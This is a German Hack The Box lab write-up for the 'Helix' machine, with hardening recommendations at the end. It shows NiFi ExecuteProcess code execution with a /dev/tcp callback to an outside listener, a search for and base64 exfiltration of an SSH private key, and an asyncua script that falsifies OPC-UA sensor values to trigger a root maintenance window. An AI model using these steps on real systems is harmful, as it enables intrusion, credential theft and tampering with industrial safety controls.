# Hack The Box: Helix Writeup

> Öffentliches Writeup für GitHub. Flags und private Schlüssel sind absichtlich nicht enthalten.

## Überblick

Helix ist eine Linux-Maschine mit einem unauthentifizierten Apache-NiFi-Interface und einer internen OT/ICS-Komponente. Der initiale Zugriff erfolgt über NiFi `ExecuteProcess` als Benutzer `nifi`. Anschließend lässt sich ein Backup eines SSH-Keys für den Benutzer `operator` auslesen. Die Privilege Escalation basiert auf einer freigegebenen `sudo`-Binary, die nur während eines privilegierten Maintenance-Windows eine Root-Shell öffnet. Dieses Window kann über interne OPC-UA-Werte ausgelöst werden.

## Recon

Initialer Scan:

```bash
nmap -Pn -sC -sV -oN nmap.txt 10.129.49.90
nmap -Pn -p- --min-rate 5000 -oN nmap-allports.txt 10.129.49.90
```

Interessante Dienste:

- HTTP/Website: Helix Industries
- Apache NiFi
- SSH
- Interne HMI/OPC-UA-Komponenten, später über lokalen Zugriff relevant

Der wichtigste Fund war Apache NiFi. Das Interface war anonym nutzbar und erlaubte das Erstellen/Ausführen von Prozessoren.

## Foothold über Apache NiFi

NiFi erlaubte anonymen Zugriff mit ausreichenden Rechten für `ExecuteProcess`. Damit konnte ein Prozessor erstellt werden, der `/bin/bash` ausführt.

Prüfkommando:

```bash
id; hostname; pwd
```

Da die API-Ausgabe nicht immer bequem war, war ein TCP-Callback zuverlässiger:

```bash
# Lokal
ncat -lvnp 9001 -k | tee out.txt

# Über NiFi ExecuteProcess
exec >/dev/tcp/<HTB_TUN_IP>/9001 2>&1; id; hostname; pwd
```

Ausführungskontext:

```text
uid=nifi
```

## Enumeration als nifi

Als `nifi` waren Teile der NiFi-Installation lesbar. Besonders interessant war das Support-Bundle-Verzeichnis:

```bash
find / -xdev \( -name 'id_rsa' -o -name '*.pem' -o -iname '*pass*' -o -iname '*cred*' -o -name '*.bak' \) -type f -readable 2>/dev/null
```

Fund:

```text
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

Die Datei war für `nifi` lesbar und enthielt einen OpenSSH Private Key für den Benutzer `operator`.

Exfiltration per Base64:

```bash
base64 -w0 /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

Lokal speichern und verwenden:

```bash
base64 -d key.b64 > operator_id_ed25519
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@10.129.49.90
```

Damit war der Benutzerzugriff als `operator` möglich.

## User Flag

Nach dem SSH-Login:

```bash
cat /home/operator/user.txt
```

Flag wird im öffentlichen Writeup nicht veröffentlicht.

## Privilege Escalation

Als `operator` zeigte `sudo -l`:

```text
(root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Ein direkter Aufruf war aber nur erfolgreich, wenn ein privilegiertes Maintenance-Window geöffnet war. Die HMI gab den entscheidenden Hinweis:

```text
This window is granted by the safety controller only when a hazardous test condition is detected
(e.g., Temp >= 295°C or Pressure >= 73 bar) while still below trip.
```

Außerdem war der interne OPC-UA-Endpunkt bekannt:

```text
opc.tcp://127.0.0.1:4840/helix/
```

Da `operator` Python mit `asyncua` verwenden konnte, ließen sich die relevanten OPC-UA-Nodes schreiben.

Wichtige Nodes:

```text
ns=2;i=13  Test Override
ns=2;i=12  Mode
ns=2;i=6   Calibration Offset
ns=2;i=4   Sensor/Temperature Reading
```

Minimaler Ablauf:

1. Test Override aktivieren
2. Mode auf `MAINTENANCE` setzen
3. Calibration Offset erhöhen, bis die Temperatur über dem Maintenance-Schwellwert liegt
4. `helix-maint-console` innerhalb des Zeitfensters starten

Beispielscript:

```python
import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def write_node(client, node_id, value, variant_type):
    node = client.get_node(node_id)
    await node.write_value(ua.DataValue(ua.Variant(value, variant_type)))

async def main():
    async with Client(url=URL) as client:
        # Test Override aktivieren
        await write_node(client, "ns=2;i=13", True, ua.VariantType.Boolean)

        # Maintenance Mode setzen
        await write_node(client, "ns=2;i=12", "MAINTENANCE", ua.VariantType.String)

        # Kalibrierung erhöhen, bis das Maintenance Window öffnet
        offset_node = client.get_node("ns=2;i=6")
        temp_node = client.get_node("ns=2;i=4")

        offset = 1.0
        while True:
            await offset_node.write_value(
                ua.DataValue(ua.Variant(offset, ua.VariantType.Double))
            )
            temp = await temp_node.get_value()
            print(f"offset={offset}, temp={temp}")

            if temp >= 296.50:
                break

            offset += 2.0
            await asyncio.sleep(2)

asyncio.run(main())
```

Nach dem Öffnen des Windows:

```bash
sudo /usr/local/sbin/helix-maint-console
```

Die Console startete eine Root-Shell:

```text
[+] Privileged maintenance access granted
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

Root-Flag lesen:

```bash
cat /root/root.txt
```

Flag wird im öffentlichen Writeup nicht veröffentlicht.

## Kill Chain

```text
Anonymous NiFi access
    -> NiFi ExecuteProcess RCE as nifi
    -> Read operator SSH private key backup
    -> SSH as operator
    -> sudo permission for helix-maint-console
    -> Manipulate OPC-UA maintenance conditions
    -> Open privileged maintenance window
    -> Root shell via helix-maint-console
```

## Takeaways

- NiFi mit anonymem Schreibzugriff ist kritisch, besonders wenn `ExecuteProcess` erlaubt ist.
- Backups von SSH-Keys in Support-Verzeichnissen sind ein direkter Weg zur Benutzerübernahme.
- ICS/OT-Logik ist oft zustandsabhängig: Die Privilege Escalation war nicht nur eine Binary, sondern erforderte das Herstellen eines bestimmten Prozesszustands.
- Hinweise in HMI-Texten können direkt die Privesc-Bedingungen beschreiben.

## Empfehlungen

- NiFi nie anonym mit Schreib- oder Execute-Rechten betreiben.
- NiFi-Policies für restricted components wie `ExecuteProcess` hart einschränken.
- Secrets/SSH-Keys nicht in Support-Bundles oder Backup-Dateien ablegen.
- Maintenance-Mechanismen nicht nur über manipulierbare Prozesswerte absichern.
- OPC-UA-Schreibrechte strikt authentifizieren und autorisieren.
